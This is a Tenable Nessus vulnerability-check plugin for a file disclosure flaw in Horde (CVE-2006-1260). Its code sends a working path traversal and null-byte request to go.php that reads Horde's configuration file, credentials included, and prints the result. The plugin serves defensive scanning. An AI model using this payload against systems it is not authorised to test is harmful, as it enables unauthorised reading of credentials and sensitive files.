#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an information disclosure flaw. 

Description :

The version of Horde installed on the remote host fails to validate
input to the 'url' parameter of the 'services/go.php' script before
using it to read files and return their contents.  An unauthenticated
attacker may be able to leverage this issue to retrieve the contents
of arbitrary files on the affected host subject to the privileges of
the web server user id.  This can result in the disclosure of
authentication credentials used by the affected application as well as
other sensitive information. 

Note that successful exploitation of this issue seems to require that
PHP's 'magic_quotes_gpc' be disabled, although this has not been
confirmed by the vendor. 

See also :

http://lists.grok.org.uk/pipermail/full-disclosure/2006-March/043657.html
http://cvs.horde.org/diff.php?r1=1.15&r2=1.16&ty=h&f=horde%2Fservices%2Fgo.php

Solution :

Upgrade to Horde 3.1 or later.

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description)
{
  script_id(21081);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1260");
  script_bugtraq_id(17117);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"23918");

  script_name(english:"Horde url Parameter File Disclosure Vulnerability");
  script_summary(english:"Tries to read arbitrary files using Horde");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("horde_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/horde"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to read a file.
  #
  # nb: Horde 3.x uses "/services"; Horde 2.x, "/util".
  foreach subdir (make_list("/services", "/util"))
  {
    if ("util" >< subdir) file = "horde.php";
    else file = "conf.php";

    req = http_get(
      item:string(
        dir, subdir, "/go.php?",
        "url=../config/", file, "%00:/&",
        "untrusted=1"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we get results that look like Horde's config file.
    if ("$conf['auth']" >< res)
    {
     report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of Horde's 'config/", file, "' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );

      security_note(port:port, data:report);
      exit(0);
    }
  }
}
